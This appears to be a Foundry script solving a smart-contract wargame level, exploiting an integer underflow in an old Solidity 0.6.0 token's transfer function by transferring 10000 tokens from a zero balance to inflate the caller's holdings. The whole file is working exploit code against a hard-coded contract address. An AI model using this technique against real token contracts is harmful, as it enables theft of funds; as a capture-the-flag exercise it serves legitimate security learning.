// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Token.sol";
import "forge-std/console.sol";

contract AttackScript is Script {
    function setUp() public {}


// solved, issue due to overflow in token contract (version 0.6.0) transfer function when subtracting big num from small num
    function run() public {
        vm.startBroadcast();

        Token token = Token(0xDEd123dc4795C597c06514F259E438BF91006F32);

        token.transfer(address(0), 10000);

        console.log(
            "bal of ",
            token.balanceOf(0x80805ae3cbE23715C1f1807A03C5fb669541C2A9)
        );  

        vm.stopBroadcast();
    }
}
